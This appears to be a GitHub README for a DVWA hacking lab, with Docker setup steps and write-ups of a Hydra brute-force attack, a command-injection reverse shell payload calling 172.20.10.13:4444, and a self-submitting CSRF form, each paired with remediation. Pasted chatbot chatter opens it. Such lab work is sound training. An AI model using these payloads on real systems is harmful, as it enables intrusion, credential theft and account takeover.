# dvwa-web-application-hacking
Perfect 👍 — let’s start by writing a **clean, professional installation section** for your GitHub `README.md` for **Damn Vulnerable Web Application (DVWA)**.

Here’s a ready-to-paste **Installation** section written in polished Markdown, using both **Docker** (recommended) and **manual setup** methods.
Later, I can help you add sections like *Overview*, *Usage*, *Screenshots*, and *Security Notice* for a full professional README.

---

## 🧰 Installation

### 🔹 Option 1 — Run DVWA using Docker (Recommended)

DVWA provides an official Docker image that lets you deploy it instantly.

#### **Step 1: Install Docker**

Make sure Docker and Docker Compose are installed:

```bash
# On Debian/Ubuntu/Kali
sudo apt update
sudo apt install docker.io docker-compose -y

# Verify installation
docker --version
docker compose version
```

#### **Step 2: Pull the official DVWA image**

```bash
docker pull vulnerables/web-dvwa
```

#### **Step 3: Run the container**

```bash
docker run --rm -it -p 8080:80 vulnerables/web-dvwa
```

> 🟢 DVWA will now be accessible at:
> 👉 [http://localhost:8080](http://localhost:8080) or [http://127.0.0.1:8080](http://127.0.0.1:8080)

#### **Step 4: Log in**

Use the default credentials:

```
Username: admin
Password: password
```

#### **Step 5: Initialize the database**

1. Go to: `http://localhost:8080/setup.php`
2. Click **“Create / Reset Database”**
3. Login again at `http://localhost:8080/login.php`

---

---

### 🧠 Notes

* DVWA intentionally contains **security vulnerabilities**.
* Use **only** in an isolated environment (like a VM or Docker).
* Never expose DVWA to the public internet.

---
# Hydra Brute Force Assessment

## Test Configuration
**Tool**: THC Hydra v9.5  
**Target**: DVWA Brute Force Module  
**Command**: 
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost http-post-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=incorrect"
```

## Results
<img width="1668" height="588" alt="image" src="https://github.com/user-attachments/assets/bec9aac4-29b7-415e-ac6f-12da9c5c56fa" />

**16 valid passwords identified:**
- 123456
- password
- 123456789
- princess
- iloveyou
- [12 more...]

## Critical Vulnerabilities
- No account lockout
- No rate limiting
- Weak passwords allowed

## Remediation
- Implement account lockout
- Enforce strong passwords
- Add rate limiting

# Command Injection Exploitation - DVWA

## Exploit Summary
**Vulnerability**: OS Command Injection  
**Target**: DVWA Command Execution Module  
**Payload**: 
```
127.0.0.1; /usr/bin/php -r '$sock=fsockopen("172.20.10.13",4444);exec("sh <&3 >&3 2>&3");'
```

## Attack Flow

### Step 1: Initial Command Injection
<img width="700" height="487" alt="image" src="https://github.com/user-attachments/assets/14ccc83b-fc82-4561-ad5e-c9658c5591d9" />
*Command injection via IP parameter with reverse shell payload*

### Step 2: Reverse Shell Connection
<img width="482" height="537" alt="image" src="https://github.com/user-attachments/assets/f5d973af-25fb-497e-b2a2-538e05f5ab12" />
*Netcat listener receiving reverse shell connection*
<img width="958" height="642" alt="image" src="https://github.com/user-attachments/assets/b2916b2c-d3c2-45ee-948f-5d3393e3ae7b" />
*Gaining shell access*
### Command injection to find php 
```
127.0.0.1; which php
```

## Technical Details
- **Injection Point**: IP address parameter
- **Reverse Shell**: PHP backdoor to attacker IP `172.20.10.13:4444`
- **Result**: Full system compromise with root access

## Remediation
- Input validation and sanitization
- Use of parameterized commands
- Principle of least privilege

# CSRF Vulnerability Report

## Vulnerability Summary
**Type**: Cross-Site Request Forgery (CSRF)  
**Risk**: High  
**Location**: DVWA Password Change Function  
**Endpoint**: `http://localhost/vulnerabilities/csrf/`

## Exploitation Proof

### Vulnerable Request
```
GET /vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change
```
The password can be changed using the vuln request by modifying the parameters password_new and password_conf
### CSRF PoC
```html
<html>
<body>
    <form action="http://localhost/vulnerabilities/csrf/" method="GET">
        <input type="hidden" name="password_new" value="attacker123">
        <input type="hidden" name="password_conf" value="attacker123">
        <input type="submit" name="Change" value="Change">
    </form>
    <script>document.forms[0].submit();</script>
</body>
</html>
```

## Impact
- Unauthorized password change for authenticated users
- Full account takeover
- No user interaction required

## Remediation
- Implement CSRF tokens
- Change GET to POST for state-changing operations
- Add SameSite cookies and referrer validation

---


